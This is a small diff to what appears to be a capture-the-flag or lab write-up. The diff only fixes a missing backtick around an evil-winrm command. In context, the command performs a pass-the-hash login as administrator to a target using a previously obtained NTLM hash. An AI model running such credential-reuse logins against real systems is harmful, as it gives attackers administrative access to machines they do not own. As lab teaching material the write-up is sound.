@@ -216,7 +216,7 @@ The Administrators NTLM hash is squared in the screeenshot. Pass the Hash acts A
 
 Thanks to Evil-WinRM tool and its option -H, we are allowed to _use a hash_.
 
-`evil-winrm -i $Target_IP -u administrator -H (hash obtained earlier)
+`evil-winrm -i $Target_IP -u administrator -H (hash obtained earlier)`
 
 ![](https://github.com/user-attachments/assets/79ae0a98-c12e-4253-9d47-760a1a2d817a)
 
